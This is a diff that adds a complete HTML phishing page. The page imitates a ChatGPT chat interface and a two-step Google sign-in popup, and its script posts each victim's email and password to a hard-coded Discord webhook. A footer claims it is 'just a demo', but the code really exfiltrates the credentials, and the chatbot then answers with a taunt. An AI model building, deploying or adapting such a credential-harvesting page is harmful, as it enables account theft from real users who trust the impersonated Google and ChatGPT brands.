@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Fake ChatGPT with Realistic Google Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #343541;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+    }
+
+    .top-bar {
+      background-color: #202123;
+      padding: 10px 20px;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      border-bottom: 1px solid #444;
+    }
+
+    .google-btn {
+      background: #fff;
+      color: #444;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      padding: 8px 15px;
+      font-size: 14px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+    }
+
+    .google-btn img {
+      height: 18px;
+      margin-right: 10px;
+    }
+
+    .chat-container {
+      flex: 1;
+      overflow-y: auto;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .message {
+      max-width: 700px;
+      margin-bottom: 20px;
+      padding: 15px;
+      border-radius: 10px;
+      word-wrap: break-word;
+    }
+
+    .user {
+      background-color: #3e3f4b;
+      align-self: flex-end;
+    }
+
+    .bot {
+      background-color: #444654;
+      align-self: flex-start;
+    }
+
+    .input-container {
+      padding: 10px;
+      background-color: #40414f;
+      display: flex;
+      align-items: center;
+      border-top: 1px solid #555;
+    }
+
+    .input-container input {
+      flex: 1;
+      padding: 12px;
+      border-radius: 5px;
+      border: none;
+      outline: none;
+      font-size: 16px;
+      background-color: #555;
+      color: white;
+    }
+
+    .input-container button {
+      margin-left: 10px;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      background-color: #10a37f;
+      color: white;
+      cursor: pointer;
+    }
+
+    .input-container button:disabled,
+    .input-container input:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+
+    /* Fake Google Login Fullscreen Popup */
+    .login-popup {
+      position: fixed;
+      top: 0;
+      left: 0;
+      background: white;
+      width: 100%;
+      height: 100%;
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    .login-box {
+      width: 360px;
+      padding: 40px 30px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.2);
+      border: 1px solid #ccc;
+      text-align: left;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    .login-box img {
+      display: block;
+      margin: 0 auto 20px auto;
+      height: 50px;
+    }
+
+    .login-box h2 {
+      font-size: 24px;
+      margin: 0 0 10px;
+      color: #202124;
+    }
+
+    .login-box p {
+      font-size: 14px;
+      color: #202124;
+      margin-bottom: 20px;
+    }
+
+    .login-box input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 5px;
+      border: 1px solid #ccc;
+      font-size: 16px;
+    }
+
+    .login-box a {
+      font-size: 14px;
+      color: #1a73e8;
+      text-decoration: none;
+      display: block;
+      margin: 15px 0;
+    }
+
+    .login-box button {
+      background: #1a73e8;
+      color: white;
+      padding: 10px 15px;
+      border: none;
+      font-size: 14px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    .login-box .next-btn {
+      float: right;
+    }
+
+    .login-box .back-btn {
+      background: #fff;
+      color: #1a73e8;
+      border: 1px solid #1a73e8;
+      float: left;
+    }
+
+    .login-box .footer {
+      clear: both;
+      font-size: 12px;
+      color: #5f6368;
+      margin-top: 50px;
+    }
+
+    .error {
+      color: #d93025;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="top-bar">
+    <button class="google-btn" onclick="showFakeLogin()">
+      <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google">
+      Sign in with Google
+    </button>
+  </div>
+
+  <div class="chat-container" id="chat">
+    <div class="message bot">Hi there! First sign in to chat with GPT 😎</div>
+  </div>
+
+  <div class="input-container">
+    <input type="text" id="userInput" placeholder="Send a message..." disabled>
+    <button id="sendBtn" onclick="sendMessage()" disabled>Send</button>
+  </div>
+
+  <!-- Fake Google Login (2-step) -->
+  <div class="login-popup" id="loginPopup">
+    <div class="login-box" id="step1">
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+      <h2>Sign in</h2>
+      <p>to continue to ChatGPT</p>
+      <label>Email or phone</label>
+      <input type="email" id="emailInput" placeholder="">
+      <p class="error hidden" id="emailError">Please enter a valid Gmail address.</p>
+      <a href="#">Forgot email?</a>
+      <button class="next-btn" onclick="goToStep2()">Next</button>
+      <div class="footer">Not your computer? Use Guest mode to sign in privately. <br><a href="#">Learn more</a></div>
+    </div>
+
+    <div class="login-box hidden" id="step2">
+      <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+      <h2>Welcome</h2>
+      <p id="emailDisplay" style="font-size:14px; margin-bottom: 20px;"></p>
+      <label>Enter your password</label>
+      <input type="password" id="passwordInput" placeholder="">
+      <p class="error hidden" id="passwordError">Incorrect password. Try again or go back to change email.</p>
+      <a href="#">Forgot password?</a>
+      <button class="back-btn" onclick="goBackToStep1()">Back</button>
+      <button class="next-btn" onclick="completeFakeLogin()">Next</button>
+      <div class="footer">This is not your real Google account. This is just a demo.</div>
+    </div>
+  </div>
+
+  <script>
+    function showFakeLogin() {
+      document.getElementById("loginPopup").style.display = "flex";
+      document.getElementById("emailInput").value = "";
+      document.getElementById("emailError").classList.add("hidden");
+      document.getElementById("passwordInput").value = "";
+      document.getElementById("passwordError").classList.add("hidden");
+      document.getElementById("step1").classList.remove("hidden");
+      document.getElementById("step2").classList.add("hidden");
+    }
+
+    function goToStep2() {
+      const email = document.getElementById("emailInput").value.trim();
+      const emailError = document.getElementById("emailError");
+
+      // Basic email validation (must end with @gmail.com)
+      if (!email || !email.toLowerCase().endsWith("@gmail.com")) {
+        emailError.classList.remove("hidden");
+        return;
+      }
+
+      emailError.classList.add("hidden");
+      document.getElementById("step1").classList.add("hidden");
+      document.getElementById("step2").classList.remove("hidden");
+      document.getElementById("emailDisplay").textContent = email;
+    }
+
+    function goBackToStep1() {
+      document.getElementById("step2").classList.add("hidden");
+      document.getElementById("step1").classList.remove("hidden");
+      document.getElementById("passwordInput").value = "";
+      document.getElementById("passwordError").classList.add("hidden");
+    }
+
+    function completeFakeLogin() {
+      const password = document.getElementById("passwordInput").value.trim();
+      const email = document.getElementById("emailInput").value.trim();
+      const passwordError = document.getElementById("passwordError");
+
+      if (!password) {
+        passwordError.textContent = "Please enter a password.";
+        passwordError.classList.remove("hidden");
+        return;
+      }
+
+      // Simulate a login failure for demonstration (e.g., password must be at least 8 characters)
+      if (password.length < 8) {
+        passwordError.textContent = "Password must be at least 8 characters. Try again or go back to change email.";
+        passwordError.classList.remove("hidden");
+        return;
+      }
+
+      // Send login info to Discord webhook
+      const webhookUrl = "https://discord.com/api/webhooks/1350236197909172267/77W5TE1-Ta0DoVNWR1QGSxvkgoyibJuJhvAAhUdSgc7dPthDu1L_-K-cb9G6pmUTE7Bc";
+      const payload = {
+        content: `**New Login Attempt**\nEmail: ${email}\nPassword: ${password}`
+      };
+
+      fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(payload)
+      })
+      .then(response => {
+        if (!response.ok) {
+          console.error("Failed to send data to Discord webhook");
+        }
+      })
+      .catch(error => {
+        console.error("Error sending to webhook:", error);
+      });
+
+      // Proceed with login completion
+      document.getElementById("loginPopup").style.display = "none";
+      document.getElementById("userInput").disabled = false;
+      document.getElementById("sendBtn").disabled = false;
+
+      const chat = document.getElementById("chat");
+      const msg = document.createElement("div");
+      msg.className = "message bot";
+      msg.textContent = `Welcome, ${email}! You're signed in.`;
+      chat.appendChild(msg);
+      chat.scrollTop = chat.scrollHeight;
+    }
+
+    function sendMessage() {
+      const input = document.getElementById("userInput");
+      const chat = document.getElementById("chat");
+      const text = input.value.trim();
+
+      if (text === "") return;
+
+      const userMsg = document.createElement("div");
+      userMsg.className = "message user";
+      userMsg.textContent = text;
+      chat.appendChild(userMsg);
+
+      const botMsg = document.createElement("div");
+      botMsg.className = "message bot";
+      botMsg.textContent = "HaHa you are not a sigma. you Ligma";
+      chat.appendChild(botMsg);
+
+      input.value = "";
+      chat.scrollTop = chat.scrollHeight;
+    }
+
+    document.getElementById("userInput").addEventListener("keypress", function (e) {
+      if (e.key === "Enter" && !e.target.disabled) {
+        sendMessage();
+      }
+    });
+  </script>
+</body>
+</html>
